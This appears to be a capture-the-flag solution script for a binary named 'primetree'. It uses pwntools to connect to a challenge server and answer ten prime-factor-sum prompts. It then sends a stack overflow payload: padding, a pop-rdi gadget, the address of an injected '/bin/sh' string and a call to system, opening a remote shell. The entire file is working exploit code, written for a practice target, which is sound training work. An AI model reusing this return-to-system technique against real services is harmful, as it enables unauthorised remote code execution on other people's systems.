from pwn import *

REMOTE = 1

if REMOTE:
    r = remote("chall2.ctfs.me",2001)
else:
    r = process("./primetree")

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6",checksec=False)
elf = ELF("./primetree",checksec=False)

r.sendline("/bin/sh")
r.recvuntil(":)\n")

v2 = [2,3,5,7,11,13,17,19,23,29,31,37,41,43,47,53,59,61,67,71,73,79,83,89,97,101,103,107,109,113,127,131,137,139,149,151,157,163,167,
      173,179,181,191,193,197,199]
arr = 0

for i in range(10):
    data = int(r.recvline().split()[2])
    print data
    for i in range(10):
        v4 = 0
        v5 = 0
        v6 = data
        while v6 > 1:
            if(v6 % v2[v4] == 0):
                v6 /= v2[v4]
                v5 += v2[v4]
                v4 = -1
            v1 = v4 + 1
            v4 = (v4 + 1) / 47
            v4 = v1 - 47 * v4
        arr = v5

    r.sendline(str(arr))
    r.recv()

padding = "A"*(0x80 + 8)
poprdi = 0x0000000000400d43

payload = padding
payload += p64(poprdi)
payload += p64(0x0000000000602108)
payload += p64(elf.symbols['system'])

r.sendline(payload)
r.interactive()
